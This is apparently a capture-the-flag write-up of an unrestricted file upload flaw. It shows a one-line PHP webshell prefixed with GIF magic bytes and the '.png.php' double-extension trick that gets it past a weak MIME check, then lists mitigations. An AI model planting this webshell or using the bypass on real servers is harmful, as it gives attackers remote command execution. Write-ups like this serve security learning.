# agent_rfi

**Category:** Unrestricted File Upload + PHP Code Execution

## Vulnerability
Profile picture upload with only a weak content-type check. Prepending GIF magic bytes to a PHP webshell bypassed both the MIME check and extension check — allowing `.php` execution on the server.

## Approach
Created a PHP webshell disguised as an image:
```
GIF89a<?php system($_GET["cmd"]); ?>
```
Saved as `shell.png.php`, uploaded via the settings page. Server confirmed upload success. Flag was found in the application after navigating to the affected profile.

## Key Insight
Magic byte spoofing (`GIF89a`) is a classic bypass when only the file header or MIME type is validated. The double extension `.png.php` caused the server to execute it as PHP.

## Exploit
See [exploit.py](./exploit.py)

## Mitigation
- Validate both magic bytes AND enforce a strict extension whitelist
- Store uploads **outside the web root** — uploaded files must never be directly executable
- Rename files on upload, stripping the original extension
- Set `php_flag engine off` in the upload directory
